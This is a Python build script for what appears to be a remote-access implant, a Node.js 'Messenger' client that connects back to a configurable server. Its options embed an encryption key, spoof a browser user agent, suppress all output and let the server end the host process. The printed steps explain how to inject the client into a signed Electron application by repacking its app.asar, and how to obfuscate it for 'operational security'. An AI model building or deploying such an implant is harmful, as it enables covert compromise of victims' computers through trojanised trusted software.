import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import its

from jinja2 import Environment, FileSystemLoader, select_autoescape

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

def add_arguments(parser):
    builder = parser.add_argument_group("Builder options")
    builder.add_argument("--name", default="client.js",
                     help="Name of the output.")
    builder.add_argument("--electron", action="store_true",
                     help="Build for Electron (uses fetch and native WebSocket for proxy awareness).")
    builder.add_argument("--no-print", action="store_true",
                     help="Compile output-suppression into the client (console.* and process.stdout/stderr are redirected to a null sink at startup).")
    builder.add_argument("--exit-on-close", action="store_true",
                     help="Call process.exit(0) when the server sends a kill signal, terminating the host process.")

    cfg = parser.add_argument_group("Client configuration")
    cfg.add_argument("--server-url", default="localhost:8080",
                     help="Server URL the client should connect to.")
    cfg.add_argument("-e", "--encryption-key", default="",
                     help="AES encryption key to embed (optional).")
    cfg.add_argument("--user-agent", default=USER_AGENT,
                     help="Custom HTTP/WebSocket User-Agent string (optional).")
    cfg.add_argument("--proxy", default="",
                     help="Proxy to use (optional).")

    retry = parser.add_argument_group("Retry behavior")
    retry.add_argument("--retry-duration", type=float, default=60.0,
                       help="Total time to retry connecting.")
    retry.add_argument("--retry-attempts", type=int, default=5,
                       help="Number of retry attempts before giving up.")


def build(args):
    template_dir = Path(__file__).resolve().parent / "templates"
    if not template_dir.is_dir():
        raise RuntimeError(f"Template directory not found: {template_dir}")

    env = Environment(
        loader=FileSystemLoader(str(template_dir)),
        autoescape=select_autoescape(enabled_extensions=("j2",)),
        trim_blocks=True,
        lstrip_blocks=True,
    )

    template = env.get_template("client.js")
    rendered = template.render(**vars(args))

    out_path = Path(args.name)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(rendered, encoding="utf-8")
    print(f"[+] Wrote Node.js client to '{out_path}'")

    if args.electron:
        out_dir = out_path.parent

        main_template = env.get_template("electron-main.js")
        main_rendered = main_template.render(**vars(args))
        main_path = out_dir / "main.js"
        main_path.write_text(main_rendered, encoding="utf-8")
        print(f"[+] Wrote Electron main process to '{main_path}'")

        renderer_template = env.get_template("electron-renderer.html")
        renderer_rendered = renderer_template.render(client_name=out_path.name)
        renderer_path = out_dir / "renderer.html"
        renderer_path.write_text(renderer_rendered, encoding="utf-8")
        print(f"[+] Wrote Electron renderer to '{renderer_path}'")

        if its.windows:
            print("[*] Install Node.js and inject into a signed Electron app:")
            print("    - Install Node.js from https://nodejs.org/en/download")
            print("    - npm install -g asar")
            print("    - asar extract path\\to\\app.asar unpacked\\")
            print(f"    - Copy-Item {out_path.name}, main.js, renderer.html -Destination unpacked\\")
            print("    - asar pack unpacked\\ app.asar")
        else:
            print("[*] Install Node.js and inject into a signed Electron app:")
            print("    - curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash && . \"$HOME/.nvm/nvm.sh\" && nvm install --lts")
            print("    - npm install -g asar")
            print("    - asar extract path/to/app.asar unpacked/")
            print(f"    - cp {out_path.name} main.js renderer.html unpacked/")
            print("    - asar pack unpacked/ app.asar")
    else:
        if its.windows:
            print("[*] Install Node.js and launch the Messenger client:")
            print("    - Install Node.js from https://nodejs.org/en/download")
            print("    - npm install ws")
            print(f"    - node {out_path}")
            print("[*] For additional operational security, bundle and obfuscate with the included webpack config:")
            print("    - npm install webpack webpack-cli javascript-obfuscator webpack-obfuscator")
            print("    - npx webpack --config webpack.conf.js")
        else:
            print("[*] Install Node.js and launch the Messenger client:")
            print("    - curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash && . \"$HOME/.nvm/nvm.sh\" && nvm install --lts")
            print("    - npm install ws")
            print(f"    - node {out_path}")
            print("[*] For additional operational security, bundle and obfuscate with the included webpack config:")
            print("    - npm install webpack webpack-cli javascript-obfuscator webpack-obfuscator")
            print("    - npx webpack --config webpack.conf.js")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(usage=argparse.SUPPRESS)
    add_arguments(parser)
    parsed_args = parser.parse_args()
    build(parsed_args)
